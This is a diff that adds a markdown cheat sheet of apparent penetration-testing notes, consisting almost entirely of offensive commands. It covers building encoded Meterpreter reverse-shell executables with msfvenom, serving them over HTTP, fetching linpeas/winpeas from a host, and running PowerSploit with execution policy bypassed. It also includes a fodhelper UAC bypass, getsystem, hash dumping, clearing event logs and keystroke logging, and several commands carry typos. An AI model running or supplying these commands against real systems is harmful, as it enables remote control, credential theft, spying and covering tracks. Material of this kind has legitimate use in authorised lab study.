@@ -1,0 +1,58 @@
+## msfvenom
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST="ip" LPORT="444" -o /root/Desktop/test.exe 
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b “\x00” LHOST="ip" LPORT="444" -f exe > /Desktop/exploit.exe 
+
+mkdir /var/www/html/share 
+chmod 777 /var/www/html/share 
+chown -R www-data:www-data 775 /var/www/html/share  
+cp /root/Desktop/test.exe /var/www/html/shate  
+
+service apache2 start 
+python3 -m http.server 80  
+
+meterpreter session
+sysinfo 
+
+on linux 
+gitclone https://github.com/PowerShellMafia/PowerSploit 
+
+meterpreter session 
+wget http://192.168.1.107/linpeas.sh  or winpeas.exe 
+upload the github file 
+shell 
+c:\users\Admin\Downloads>powershell -ExecutionPolicy Bypass	-command “.\file;Invoke-AllChecks” 
+run vnc 
+
+meterpreter 
+exploit -j -z 
+
+another post exploitation module 
+wget http://192.168.1.107/linpeas.sh  or winpeas.exe 
+upload the github file 
+shell 
+c:\users\Admin\Downloads>powershell -ExecutionPolicy Bypass	-command “.\file;Invoke-AllChecks”  
+meterpreter > run post/windows/gather/smart_hashdump 
+get system -t 1 
+background 
+
+use another module 
+use exploit/windows/local/bypassuac_fodhelper 	
+show options 
+set payload windows/meterpreter/reverse_tcp 
+set LHOST 
+set LPORT 
+exploit -j -z 
+getuid 
+getsystem -t 1 
+run post/windows/gather/smart_hashdump 
+clearev 
+search -f filename.extension (file.sys)
+keysacn_start 
+keyscan_stop 
+keyscan_dump 
+shutdown 
+ 
+
+
+
+
